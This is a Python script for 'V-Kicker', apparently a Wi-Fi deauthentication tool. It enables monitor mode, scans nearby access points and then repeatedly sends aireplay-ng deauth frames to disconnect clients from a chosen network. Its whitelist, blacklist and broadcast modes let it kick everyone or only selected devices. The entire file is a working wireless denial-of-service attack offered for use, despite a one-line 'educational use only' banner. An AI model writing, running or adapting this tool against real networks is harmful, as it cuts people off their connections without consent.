import datetime
import os
import signal
import subprocess
import sys
import time
from printer import Printer

# ---[ CLASSES ]--- #

class Adapter:
  def __init__(self, name, is_monitor):
    self.name = name
    self.is_monitor = is_monitor

class Network:
    def __init__(self, bssid, channel, power, essid):
        self.bssid = bssid
        self.channel = channel
        self.power = power
        self.essid = essid

class Client:
  def __init__(self, mac):
    self.mac = mac

# ---[ GLOBAL VARIABLES ]--- #

__location__ = os.path.realpath(os.path.join(os.getcwd(), os.path.dirname(__file__)))

# List of Adapter objects
adapters = []

# Adapters
original_adapter = None
choosen_adapter = None

# List of Network objects
networks = []
last_network_count = -1

# Choosen network
choosen_network = None

# Choosen mode
choosen_mode = None

# List of Client objects
clients = []
white_listed = []
black_listed = []

# ---[ MANAGEMENT ]--- #

def is_root():
    return os.geteuid() == 0

def show_time(message):
    now = datetime.datetime.now()
    Printer.writeline(" {W}[{G}" + f"{now.hour:02d}" + "{W}:{G}" + f"{now.minute:02d}" + "{W}:{G}" + f"{now.second:02d}" + "{W}] " + f"{message}")

def show_question(msg):
    Printer.write("{?} " + msg + " ")
    return input()

def has_monitor_adapter():
    for adapter in adapters:
        if adapter.is_monitor:
            return adapter
    
    return None
     
# ---[ STEPS ]--- #

def reset_variables():
    for fname in os.listdir(__location__):
        if fname.startswith("tmp_"):
            os.remove(os.path.join(__location__, fname))

    adapters.clear()
    networks.clear()

def show_header():                      
    Printer.writeline("{C}                                                                            ")
    Printer.writeline("{C}                                 *@@@@@@(                                   ")
    Printer.writeline("{C}                        %@@@@@@@@@@@@@                                      ")
    Printer.writeline("{C}                   @@@@@@@@@@@@@@@@                                         ")
    Printer.writeline("{C}                @@@@@@@@@@@@@@@@                      @@@@@@(               ")
    Printer.writeline("{C}             .@@@@@@@@@@@@@@@&                   *@@@@@@@@@@@@@             ")
    Printer.writeline("{C}            @@@@@@@@@@@@@@@                  @@@@@@@@@@@@@@@@@@@            ")
    Printer.writeline("{C}           @@@@@@@@@@@@@       #@                  %@@@@@@@@@@@@@           ")
    Printer.writeline("{C}           @@@@@@@@@@@@@@@@@@                (@@@@@@@@@@@@@@@@@@@           ")
    Printer.writeline("{C}           @@@@@@@@@@@@@@@             *@@@@@@@@@@@@@@@@@@@@@@@@@           ")
    Printer.writeline("{C}           @@@@@@@@@@@           *@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@           ")
    Printer.writeline("{C}            @@@@@@,         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.           ")
    Printer.writeline("{C}            %@@      ,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@            ")
    Printer.writeline("{C}                @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@             ")
    Printer.writeline("{C}              @@@@@@@@{Y}***{C}@@&@@@@@@@@@@@@@@@@@@@@@@@{Y}***{C}@@@@@@@@              ")
    Printer.writeline("{C}              @@@@@{Y}*********{C}@@@@@@@@@@@@@@@@@@@@{Y}*********{C}@@@@@              ")
    Printer.writeline("{C}              @@@@@{Y}**************{C}@@@@@@@@@@{Y}***************{C}@@@@              ")
    Printer.writeline("{C}              @@@@@{Y}***************{C}@@@@@@@@{Y}***************{C}@@@@@              ")
    Printer.writeline("{C}              @@@@@@{Y}*************{C}@@@@@@@@@@@{Y}************{C}@@@@@@(             ")
    Printer.writeline("{C}              @@@@@@@@{Y}*******{C}@@@@@@@@@@@@@@@@@@{Y}*******{C}@@@@@@@@&             ")
    Printer.writeline("{C}              @@@@@@@@@@@@@@@@@@@@@@@{R}###{C}@@@@@@@@@@@@@@@@@@@@@@%             ")
    Printer.writeline("{C}              @@@@@@@@@@@@@@@@@@@@@{R}#######{C}@@@@@@@@@@@@@@@@@@@@              ")
    Printer.writeline("{C}               @@@@@@@@@@@@@@@@@@@@{R}###{C}@{R}###{C}@@@@@@@@@@@@@@@@@@@               ")
    Printer.writeline("{C}                 .@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                 ")
    Printer.writeline("{C}                     @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                     ")
    Printer.writeline("{C}                          @@@@@@@@@@@@@@@@@@@@@@@@.                         ")
    Printer.writeline("{C}                           @@@@@@@@@@@@@@@@@@@@@@                           ")
    Printer.writeline("{C}                             @  @@@(@@@@(@@@  @@                            ")
    Printer.writeline("{C}                                 @   (@   @                                 ")
    Printer.writeline("{C}                                                                            ")
    Printer.writeline("{C}                                                                            ")
    Printer.writeline("{C}                             {B}++++++++++++++++++                             ")
    Printer.writeline("{C}                             {B}+    {Y}V-Kicker    {B}+                              ")
    Printer.writeline("{C}                             {B}++++++++++++++++++                             ")
    Printer.writeline("{C}                                                                            ")
    Printer.writeline("  {Y}Educational {R}use only. Use this tool {Y}only {R}with everyone involved {Y}consent.  ")
    Printer.writeline("                                                                            ")

def check_dependencies():
    if (is_root() == False):
        Printer.writeline("{x} run this scripts as {R}sudo {Y}to continue.")
        sys.exit(1)

def find_adapters():
    Printer.writeline("{!} searching for {G}wlan {W}adapters.")

    adapters.clear()

    cmd = subprocess.run("ifconfig -a | grep wlan", shell = True, stdout = subprocess.PIPE)
    
    try:
        lines = cmd.stdout.decode("utf8").splitlines()
    except:
        Printer.writeline("{x} error while getting {R}wlan {Y}adapters.")
        sys.exit(1)

    if len(lines) == 0:

        Printer.writeline("{x} no {R}wlan {Y}adapters found.")
        sys.exit(1)
        
    for line in lines:
        iStart = line.find("wlan")
        iEnd = line.find(":")
        interface = line[iStart:iEnd - iStart]

        # TODO: find a better way to check if it is monitor
        adapter = Adapter(interface, "mon" in line)
        adapters.append(adapter)

def choose_adapter():
    global choosen_adapter

    if has_monitor_adapter() != None:
        choosen_adapter = has_monitor_adapter()
    elif len(adapters) == 1:
        choosen_adapter = adapters[0]
    elif len(adapters) == 0:
        Printer.writeline("{x} no {R}adapters {Y}found.")
    else:
        Printer.writeline("{!} available {G}adapters{W}:")
        Printer.writeline("")

        for i, adapter in enumerate(adapters):
            Printer.writeline("  {G}" + str(i) +"{W}) {Y}" + adapter.name + "{W}")

        Printer.writeline("")

        # TODO: check for int()
        iAdapter = int(show_question("choose an {Y}adapter {W} to use:"))
        choosen_adapter = adapters[iAdapter]
    
    Printer.writeline("{!} adapter {G}" + choosen_adapter.name + "{W} choosen.")

def airmon_check_kill():
    Printer.writeline("{!} killing processes on {G}" + choosen_adapter.name + "{W} adapter.")
    cmd = subprocess.run("airmon-ng check kill", shell = True, stdout = subprocess.PIPE)

    if cmd.returncode != 0:
        Printer.writeline("{x} error while killing processes on {G}" + choosen_adapter.name + "{W} adapter.")
        sys.exit(1)

def enable_monitor_mode():
    Printer.writeline("{!} enabling monitor mode for {G}" + choosen_adapter.name + "{W} adapter.")

    global original_adapter
    original_adapter = Adapter(choosen_adapter.name, choosen_adapter.is_monitor)

    cmd = subprocess.run("airmon-ng start " + choosen_adapter.name, shell = True, stdout = subprocess.PIPE)

    if cmd.returncode != 0:
        Printer.writeline("{x} error while enabling monitor mode for {G}" + choosen_adapter.name + "{W} adapter.")
        sys.exit(1)

    Printer.writeline("{!} monitor mode enabled for {G}" + choosen_adapter.name + "{W} adapter.")

def scan_access_points():
    Printer.writeline("{!} scanning AP on {G}" + choosen_adapter.name + "{W} adapter.")

    global last_network_count
    last_network_count = -1

    # Launch network scan process
    proc_network_scan = subprocess.Popen("airodump-ng " + choosen_adapter.name + " --write tmp_networks --update 1 --output-format csv --write-interval 1", shell = True, stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL)

    # Set out file timeout to 10 seconds
    for i in range(0, 10):
        if os.path.exists(os.path.join(__location__, 'tmp_networks-01.csv')) == False:
            time.sleep(1)
            continue
        else:
            break

    if os.path.exists(os.path.join(__location__, 'tmp_networks-01.csv')) == False:
        Printer.writeline("{x} unable to obtain {R}networks {Y}after 10 attempts.")
        sys.exit(1)

    try:
        Printer.writeline("{!} available {G}networks{W}:")
        Printer.writeline(" ")
        Printer.writeline("{B} NUM                     ESSID    CH  POWER")
        Printer.writeline("{B} ---  ------------------------  ----  -----")
        
        while True:
            with open(os.path.join(__location__, 'tmp_networks-01.csv')) as file:
                lines = [line.rstrip() for line in file]

                if len(lines) <= 0:
                    time.sleep(1)
                    continue
        
                i_start = -1
                i_end = -1

                # Find start and end
                for i, line in enumerate(lines):
                    if "BSSID" in line and i_start == -1:
                        i_start = i + 1
                    
                    if "Station MAC" in line and i_end == -1:
                        i_end = i - 1

                # Check if has found something
                if i_start < 0 or i_end < 0:
                    Printer.writeline("{x} unable to parse {R}network {Y}file.")
                    sys.exit(1)

                # Clear all networks
                networks.clear()

                # Get networks
                for raw_network in lines[i_start : i_end]:
                    network = raw_network.split(",")

                    bssid = network[0].strip()
                    channel = network[3].strip()
                    power = int(network[8].strip("").replace("-", ""))
                    essid = network[13].strip()

                    n = Network(bssid, channel, power, essid)
                    networks.append(n)    
                
                # Print networks
                if last_network_count >= 0:
                    Printer.go_up(last_network_count + 2)

                for i, network in enumerate(networks):
                    if last_network_count >= 0:
                        Printer.clear_line()

                    essid = network.essid if len(network.essid) <= 24 else network.essid[:21] + "..."
                    essid = essid if len(essid) > 0 else "<" + network.bssid + ">"

                    if network.power > 50:
                        power_color = "{G}"
                    elif network.power > 35:
                        power_color = "{Y}"
                    else:
                        power_color = "{R}"

                    Printer.write(" {G}"+ str(i).rjust(3) + " ")
                    Printer.write(" {W}"+ essid.rjust(24) + " ")
                    Printer.write(" {Y}"+ network.channel.rjust(4) + " ")
                    Printer.write(" " + power_color + (str(network.power) + "db").rjust(5) + "\n")

                Printer.clear_line()
                Printer.writeline(" ")
                Printer.clear_line()
                Printer.writeline("{!} use {Y}CTRL {W}+ {Y}C {W}to stop scanning.")

                last_network_count = len(networks)
                time.sleep(1)

    except KeyboardInterrupt:
        os.kill(proc_network_scan.pid, signal.SIGKILL)

        choosen_i_network = show_question("choose a {Y}network{W}:")

        global choosen_network
        choosen_network = networks[int(choosen_i_network)]

        Printer.writeline("{!} network {G}" + choosen_network.essid + "{W} choosen.")

def choose_mode():
    Printer.writeline("{!} avaiable {G}modes{W}:")
    Printer.writeline("")
    Printer.writeline("  {G}0{W}) {Y}Whitelist{W}: kick everyone except for whitelisted clients.")
    Printer.writeline("  {G}1{W}) {Y}Blacklist{W}: kick only blacklisted clients.")
    Printer.writeline("  {G}2{W}) {Y}Broadcast{W}: kick everyone.")
    Printer.writeline("")

    global choosen_mode
    choosen_mode = show_question("choose a {Y}mode{W}:")

def kicker():
    Printer.writeline("{!} initializing kicker.")
    Printer.writeline("")

    # Launch client scan process
    proc_client_scan = subprocess.Popen("airodump-ng --channel " + choosen_network.channel + " --bssid " + choosen_network.bssid + " " + choosen_adapter.name + " --write tmp_clients --update 1 --output-format csv --write-interval 1", shell = True, stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL)

    # Set out file timeout to 10 seconds
    for i in range(0, 10):
        if os.path.exists(os.path.join(__location__, 'tmp_clients-01.csv')) == False:
            time.sleep(1)
            continue
        else:
            break

    if os.path.exists(os.path.join(__location__, 'tmp_clients-01.csv')) == False:
        Printer.writeline("{x} unable to obtain {R}clients {Y}after 10 attempts.")
        sys.exit(1)

    # Whitelist
    if choosen_mode == "0" and os.path.exists(os.path.join(__location__, '_WHITELIST.txt')):
        with open(os.path.join(__location__, '_WHITELIST.txt')) as file:
            lines = [line.rstrip() for line in file]
            
            for line in lines:
                if line.startswith("#") or line.strip() == "":
                    continue
                    
                white_listed.append(line.strip())

                Printer.writeline("{!} client {G}" + line.strip() + " {W}added to whitelist.")
            
            Printer.writeline("")
    # Blacklist
    elif choosen_mode == "1" and os.path.exists(os.path.join(__location__, '_BLACKLIST.txt')):
        with open(os.path.join(__location__, '_BLACKLIST.txt')) as file:
            lines = [line.rstrip() for line in file]
            
            for line in lines:
                if line.startswith("#") or line.strip() == "":
                    continue
                    
                black_listed.append(line.strip())

                Printer.writeline("{!} client {G}" + line.strip() + " {W}added to blacklist.")
            
            Printer.writeline("")
    try:
        while True:
            with open(os.path.join(__location__, 'tmp_clients-01.csv')) as file:
                lines = [line.rstrip() for line in file]

                if len(lines) <= 0:
                    time.sleep(1)
                    continue
        
                i_start = -1

                # Find start and end
                for i, line in enumerate(lines):
                    if "Station MAC" in line:
                        i_start = i + 1
                        break

                # Check if has found something
                if i_start < 0:
                    Printer.writeline("{x} unable to parse {R}clients {Y}file.")
                    sys.exit(1)

                # Clear all clients
                clients.clear()

                # Get networks
                for raw_client in lines[i_start:]:
                    if raw_client.strip() == "":
                        continue

                    splitted_client = raw_client.split(",")
                    mac = splitted_client[0].strip()
                    c = Client(mac)
                    clients.append(c)    
                    
                # Do magic
                for splitted_client in clients:
                    if choosen_mode == "0" and splitted_client.mac in white_listed:
                        show_time("{G}ignored {W}client {Y}" + splitted_client.mac + " {W}thanks to {Y}whitelist{W}.")
                    elif choosen_mode == "1" and splitted_client.mac in black_listed:
                        subprocess.Popen("aireplay-ng --deauth 10 -a " + choosen_network.bssid + " -c " + splitted_client.mac + " " + choosen_adapter.name, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
                        show_time("{R}deauth {W}sent to {Y}" + splitted_client.mac + " {W}thanks to {Y}blacklist{W}.")
                    else:
                        subprocess.Popen("aireplay-ng --deauth 10 -a " + choosen_network.bssid + " -c " + splitted_client.mac + " " + choosen_adapter.name, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
                        show_time("{R}deauth {W}sent to {Y}" + splitted_client.mac + "{W}.")

                show_time("use {Y}CTRL {W}+ {Y}C {W}to stop kicking.")
                time.sleep(1)

    except KeyboardInterrupt:
        os.kill(proc_client_scan.pid, signal.SIGKILL)
        Printer.writeline("")
        Printer.writeline("{!} kicker {G}successfully {W}disabled.")

def disable_monitor_mode():
    Printer.writeline("{!} disabling monitor mode for {G}" + choosen_adapter.name + " {W}adapter.")
    cmd = subprocess.run("airmon-ng stop " + choosen_adapter.name, shell = True, stdout = subprocess.PIPE)

    if cmd.returncode != 0:
        Printer.writeline("{x} error while disabling monitor mode for {G}" + choosen_adapter.name + " {W}adapter.")
        sys.exit(1)

    Printer.writeline("{!} monitor mode disabled for {G}" + choosen_adapter.name + " {W}adapter.")

def restore_network_manager():
    Printer.writeline("{!} re-establishing the network for {G}" + original_adapter.name + " {W}adapter.")
    subprocess.run("ifconfig " + original_adapter.name + " up", shell = True, stdout = subprocess.PIPE)
    subprocess.run("service NetworkManager restart", shell = True, stdout = subprocess.PIPE)

# ---[ MAIN ]--- #

if __name__ == "__main__":
    reset_variables()
    show_header()
    check_dependencies()
    find_adapters()

    if has_monitor_adapter() == None:
        choose_adapter()
        airmon_check_kill()
        enable_monitor_mode()
        find_adapters()
        
    choose_adapter()
    scan_access_points()
    choose_mode()
    kicker()
    reset_variables()
    disable_monitor_mode()
    restore_network_manager()
